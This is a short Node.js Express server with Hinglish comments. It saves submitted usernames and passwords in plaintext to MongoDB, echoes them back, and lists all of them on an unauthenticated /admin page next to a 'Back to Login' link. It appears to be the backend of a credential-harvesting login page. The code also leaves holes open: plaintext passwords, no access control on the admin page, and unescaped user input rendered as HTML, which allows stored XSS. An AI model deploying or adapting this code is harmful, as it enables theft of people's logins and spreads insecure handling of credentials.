const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

app.use(express.urlencoded({ extended: true }));

// 1. MongoDB Connection
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log("MongoDB Connected!"))
    .catch((err) => console.log("Error:", err));

// 2. Database Schema
const userSchema = new mongoose.Schema({
    username: String,
    password: String,
    createdAt: { type: Date, default: Date.now }
});

const UserData = mongoose.model('UserData', userSchema);

// 3. Bahar rakhi hui index.html file dikhane ke liye (Yeh naya add kiya hai)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 4. Form Submit Hone Par Data Save Karna
app.post('/save-data', async (req, res) => {
    try {
        const newEntry = new UserData({
            username: req.body.username,
            password: req.body.password
        });

        await newEntry.save();

        res.send(`
            <h2>Data Save Ho Gaya!</h2>
            <p>Username: ${newEntry.username}</p>
            <p>Password: ${newEntry.password}</p>
            <br>
            <a href="/admin">Admin Panel Dekhein</a> | <a href="/">Wapas Jayein</a>
        `);
    } catch (error) {
        res.status(500).send("Error: " + error.message);
    }
});

// 5. Admin Panel
app.get('/admin', async (req, res) => {
    try {
        const allUsers = await UserData.find().sort({ createdAt: -1 });
        let tableRows = "";

        allUsers.forEach((item, index) => {
            tableRows += `
                <tr>
                    <td>${index + 1}</td>
                    <td>${item.username}</td>
                    <td>${item.password}</td>
                    <td>${item.createdAt.toLocaleString()}</td>
                </tr>
            `;
        });

        res.send(`
            <h1>Admin Panel</h1>
            <table border="1" cellpadding="10" style="border-collapse: collapse;">
                <tr>
                    <th>#</th>
                    <th>Username / Email</th>
                    <th>Password</th>
                    <th>Time</th>
                </tr>
                ${tableRows}
            </table>
            <br>
            <a href="/">Back to Login</a>
        `);
    } catch (error) {
        res.status(500).send("Admin panel load nahi ho paya.");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on port " + PORT));
